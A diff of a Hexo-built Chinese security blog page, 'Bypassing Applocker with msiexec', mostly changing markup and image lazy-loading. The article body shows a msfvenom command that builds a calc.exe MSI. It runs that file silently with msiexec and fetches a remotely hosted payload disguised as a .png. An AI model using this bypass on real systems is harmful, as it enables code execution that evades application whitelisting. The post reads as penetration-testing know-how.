@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -104,21 +87,21 @@
 
 
 
-  <meta name="description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &amp;gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
+  <meta name="description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
 <meta name="keywords" content="applocker">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bypassing Applocker with msiexec">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Bypassing_Applocker_with_msiexec.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
-<meta property="og:description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &amp;gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
+<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/12/877252790.gif">
-<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2016/12/3415648562.gif">
+<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.772Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Bypassing Applocker with msiexec">
-<meta name="twitter:description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &amp;gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
-<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2016/12/877252790.gif">
+<meta name="twitter:description" content="msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi">
+<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
 
 
 
@@ -498,12 +481,12 @@
       
 
       
-        <p>msf生成MSI：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f msi -<span class="selector-tag">p</span> windows/exec CMD=calc<span class="selector-class">.exe</span> &gt; cacl.msi</span><br></pre></td></tr></table></figure></p>
-<p>命令行运行：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec <span class="string">/quiet</span> <span class="string">/i</span> cacl.msi</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://evi1cg.github.io/usr/uploads/2016/12/877252790.gif" alt="1.gif"></p>
+        <meta name="generator" content="Hexo 3.9.0"><p>msf生成MSI：<br></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f msi -<span class="selector-tag">p</span> windows/exec CMD=calc<span class="selector-class">.exe</span> > cacl.msi</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>命令行运行：<br></p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec <span class="string">/quiet</span> <span class="string">/i</span> cacl.msi</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p></p><div class="progress-images" style="width:852px"><div class="progress-images--placeholder" style="padding-bottom: 73.12206572769954%;"></div><img src="/images/loading.svg" alt="1.gif" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2016/12/877252790.gif" data-thumb="/images/thumb/ba51ded1bff37bbfd000d9602f4de030.gif"></div><p></p>
 <a id="more"></a>
-<p>将payload放在远程服务器上运行：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /<span class="selector-tag">q</span> /<span class="selector-tag">i</span> https:<span class="comment">//evi1cg.github.io/payloads/calc.png</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://evi1cg.github.io/usr/uploads/2016/12/3415648562.gif" alt="2.gif"></p>
+<p>将payload放在远程服务器上运行：<br></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /<span class="selector-tag">q</span> /<span class="selector-tag">i</span> https:<span class="comment">//evi1cg.github.io/payloads/calc.png</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p></p><div class="progress-images" style="width:852px"><div class="progress-images--placeholder" style="padding-bottom: 73.12206572769954%;"></div><img src="/images/loading.svg" alt="2.gif" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2016/12/3415648562.gif" data-thumb="/images/thumb/309bfe80b282c8bd81a6ae33a26f32a8.gif"></div><p></p>
 
       
     </div>
@@ -848,7 +831,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -859,7 +842,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -870,7 +853,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -881,7 +864,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -916,7 +899,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1598,5 +1581,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
